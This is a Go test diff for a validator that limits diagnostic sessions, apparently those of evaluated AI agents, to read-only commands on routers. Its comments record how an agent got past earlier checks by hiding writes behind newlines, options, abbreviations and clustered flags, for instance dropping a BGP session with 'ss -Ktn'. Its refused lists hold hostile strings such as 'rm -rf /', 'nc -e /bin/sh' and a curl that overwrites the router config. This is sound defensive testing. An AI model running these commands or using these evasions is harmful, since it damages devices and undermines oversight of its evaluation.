@@ -70,3 +70,248 @@ func TestADiagnosticSessionMayOnlyObserve(t *testing.T) {
 		}
 	}
 }
+
+// A newline is a command separator, and vtysh is not an exception.
+//
+// The metacharacter check exempted vtysh, because a show command may legally
+// contain a pipe, and only the first word of a -c body was validated. Both
+// together let a diagnostic session send
+// "show version\nconfigure terminal\ninterface lo\ndescription ..." as one
+// argument whose first word is "show", and change the router -- while a plain
+// "configure terminal" was refused. An agent that can edit the device it is
+// being scored on is not being scored on anything.
+func TestADiagnosticSessionCannotHideACommandBehindANewline(t *testing.T) {
+	refused := [][]string{
+		{"vtysh", "-c", "show version\nconfigure terminal\ninterface lo\ndescription x\nend"},
+		{"vtysh", "-c", "show version\rconfigure terminal"},
+		{"vtysh", "-c", "show version; configure terminal"},
+		{"vtysh", "-c", "show ip bgp\nclear ip bgp *"},
+		{"ip", "-br\naddr", "show"},
+		{"ping", "1.2.3.4\nreboot"},
+		{"cat", "/etc/frr/frr.conf\nrm -rf /"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%q hides a second command behind a separator and was allowed", c)
+		}
+	}
+	// And the legitimate uses still work, including vtysh's own output filter.
+	allowed := [][]string{
+		{"vtysh", "-c", "show ip bgp summary"},
+		{"vtysh", "-c", "show running-config | include neighbor"},
+		{"vtysh", "-c", "show ip route json"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%q is how you read a router, and it was refused: %v", c, err)
+		}
+	}
+}
+
+// A write verb is a write verb wherever it appears.
+//
+// The parser took the first argument that did not begin with a dash as the
+// object and the next as the verb, so `ip -family inet link set dev lo down` --
+// where "inet" is the argument to -family -- made "inet" the object, "link" the
+// verb, and "set" invisible. A diagnostic session took an interface down on a
+// host it was being scored on.
+func TestADiagnosticSessionCannotHideAWriteBehindAnOption(t *testing.T) {
+	refused := [][]string{
+		{"ip", "-family", "inet", "link", "set", "dev", "lo", "down"},
+		{"ip", "-f", "inet", "addr", "add", "10.0.0.1/24", "dev", "eth0"},
+		{"ip", "-j", "-family", "inet6", "route", "del", "default"},
+		{"ip", "-batch", "/tmp/commands"},
+		{"ip", "-netns", "other", "link", "show"},
+		{"ip", "-force", "-batch", "/tmp/x"},
+		{"bridge", "-j", "link", "set", "dev", "eth0", "state", "0"},
+		{"sysctl", "-w", "net.ipv4.ip_forward=0"},
+		{"sysctl", "--write", "net.ipv4.ip_forward=0"},
+		{"tcpdump", "-i", "eth0", "-w", "/tmp/cap.pcap"},
+		{"tcpdump", "-i", "eth0", "-G", "1", "-z", "/bin/sh"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%v changes the device or runs a command on it, and was allowed", c)
+		}
+	}
+	allowed := [][]string{
+		{"ip", "-family", "inet", "link", "show"},
+		{"ip", "-j", "-br", "addr", "show"},
+		{"ip", "-6", "route", "show"},
+		{"ip", "route", "get", "1.2.3.4"},
+		{"bridge", "-j", "link", "show"},
+		{"sysctl", "net.ipv4.ip_forward"},
+		{"tcpdump", "-n", "-c", "10", "-i", "eth0"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%v only reads, and was refused: %v", c, err)
+		}
+	}
+}
+
+// The long option is the same option.
+//
+// The vtysh rule matched the literal "-c" and nothing else, so
+// `vtysh --command 'configure terminal' --command 'interface lo' ...` went
+// through untouched and a diagnostic session edited a router. And `ethtool -K`
+// turns offloads off on a device the session is only meant to watch, which no
+// scan for write verbs would ever have found: the fix for a denylist that keeps
+// being walked past is not a longer denylist.
+func TestADiagnosticSessionHasAGrammarRatherThanADenylist(t *testing.T) {
+	refused := [][]string{
+		{"vtysh", "--command", "configure terminal"},
+		{"vtysh", "--command=configure terminal"},
+		{"vtysh", "-c=configure terminal"},
+		{"vtysh", "-d", "bgpd", "-c", "show ip bgp"},
+		{"vtysh", "-b"},
+		{"vtysh", "-f", "/tmp/config"},
+		{"ethtool", "-K", "host", "rx", "off"},
+		{"ethtool", "-k", "host"},
+		{"nc", "-e", "/bin/sh", "10.0.0.1", "9"},
+		{"curl", "-o", "/etc/frr/frr.conf", "http://x/"},
+		{"wget", "-O", "/tmp/x", "http://x/"},
+		{"birdc", "configure"},
+		{"ss", "-K", "dst", "10.0.0.1"},
+		{"arp", "-d", "10.0.0.1"},
+		{"arp", "-s", "10.0.0.1", "00:11:22:33:44:55"},
+		{"hostname", "not-this-router"},
+		{"sysctl", "net.ipv4.ip_forward=0"},
+		{"sysctl", "-p"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%v can change the device or is not needed to observe one, and was "+
+				"allowed", c)
+		}
+	}
+	allowed := [][]string{
+		{"vtysh", "--command", "show ip bgp summary"},
+		{"vtysh", "--command=show running-config"},
+		{"vtysh", "-c", "show ip route json"},
+		{"ss", "-tnp"},
+		{"arp", "-n"},
+		{"hostname"},
+		{"hostname", "-f"},
+		{"sysctl", "net.ipv4.ip_forward"},
+		{"iptables-save"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%v only observes, and was refused: %v", c, err)
+		}
+	}
+}
+
+// iproute2 accepts abbreviations, so a validator matching exact spellings is
+// matching the wrong thing.
+//
+// `ip link se dev lo up` is `ip link set dev lo up`: "se" is an unambiguous
+// prefix of "set". A diagnostic session brought an interface up on a device it
+// was being scored on, and could as easily have brought one down. And
+// `iptables-save -f <path>` creates or truncates a file as root anywhere on the
+// device, which was allowed because the program's name says "save".
+func TestADiagnosticSessionCannotUseAnAbbreviation(t *testing.T) {
+	refused := [][]string{
+		{"ip", "link", "se", "dev", "lo", "down"},
+		{"ip", "link", "se", "dev", "lo", "up"},
+		{"ip", "ad", "add", "10.0.0.1/24", "dev", "eth0"},
+		{"ip", "addr", "ad", "10.0.0.1/24", "dev", "eth0"},
+		{"ip", "route", "de", "default"},
+		{"ip", "route", "repl", "default", "via", "10.0.0.1"},
+		{"ip", "-b", "/tmp/commands"},
+		{"ip", "-bat", "/tmp/commands"},
+		{"ip", "-net", "other", "link", "show"},
+		{"iptables-save", "-f", "/tmp/proof"},
+		{"ip6tables-save", "--file", "/tmp/proof"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%v is an abbreviated write and was allowed", c)
+		}
+	}
+	allowed := [][]string{
+		{"ip", "link", "show"},
+		{"ip", "link", "sh"},
+		{"ip", "-br", "addr", "show", "dev", "eth0"},
+		{"ip", "route", "get", "1.2.3.4"},
+		{"iptables-save"},
+		{"iptables-save", "-c"},
+		{"iptables-save", "-t", "filter"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%v only observes, and was refused: %v", c, err)
+		}
+	}
+}
+
+// Short options cluster, so matching one exactly matches one spelling of
+// several.
+//
+// An evaluated agent ran `ss -Ktn dst <peer>` inside the real sandbox and
+// dropped a BGP session on a device it was being scored on: the validator
+// rejected "-K" and had nothing to say about "-Ktn". The same mistake was in
+// every validator that compared an option as a whole string.
+func TestADiagnosticSessionCannotClusterAWriteOption(t *testing.T) {
+	refused := [][]string{
+		{"ss", "-K", "dst", "10.0.0.1"},
+		{"ss", "-Ktn", "dst", "10.0.0.1"},
+		{"ss", "-tnK", "dst", "10.0.0.1"},
+		{"ss", "--kill", "dst", "10.0.0.1"},
+		{"arp", "-nd", "10.0.0.1"},
+		{"arp", "-v", "-s", "10.0.0.1", "00:11:22:33:44:55"},
+		{"tcpdump", "-nw", "/tmp/x"},
+		{"tcpdump", "-ni", "eth0", "-Gz", "/bin/sh"},
+		{"sysctl", "-aw", "net.ipv4.ip_forward=0"},
+		{"hostname", "-vF", "/tmp/name"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%v hides a write in a cluster of short options and was allowed", c)
+		}
+	}
+	allowed := [][]string{
+		{"ss", "-tn"},
+		{"ss", "-tnp", "state", "established"},
+		{"arp", "-n"},
+		{"tcpdump", "-nni", "eth0", "-c", "5"},
+		{"sysctl", "-a"},
+		{"hostname", "-f"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%v only observes, and was refused: %v", c, err)
+		}
+	}
+}
+
+// ss's observational options are an allowlist now.
+//
+// The denylist rejected -K and missed -D, which dumps raw socket information to
+// a file of the caller's choosing -- as root, anywhere on the device, including
+// over a routing configuration. There is no reason to believe the next reader
+// of ss's manual page would have found the last of them.
+func TestADiagnosticSessionMayRunSsOnlyToPrint(t *testing.T) {
+	refused := [][]string{
+		{"ss", "-D", "/tmp/dump"},
+		{"ss", "-tnD", "/tmp/dump"},
+		{"ss", "--diag=/tmp/dump"},
+		{"ss", "-K"},
+		{"ss", "-Ktn"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%v writes or kills, and was allowed", c)
+		}
+	}
+	allowed := [][]string{
+		{"ss"}, {"ss", "-tn"}, {"ss", "-tnp"}, {"ss", "-s"},
+		{"ss", "-tuln"}, {"ss", "-n", "state", "established"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%v only prints, and was refused: %v", c, err)
+		}
+	}
+}
